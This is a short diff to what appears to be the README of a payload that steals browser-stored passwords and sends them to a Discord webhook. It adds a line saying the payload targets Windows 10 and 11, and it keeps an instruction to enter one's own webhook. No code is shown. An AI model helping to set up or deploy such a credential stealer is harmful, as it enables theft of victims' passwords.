@@ -2,6 +2,8 @@
 
 This payload exfills user browser password to Discord.
 
+**It targets Windows 10, 11**
+
 You must edit the following parameters on the payload:
 * Hook - your Discord hook
 
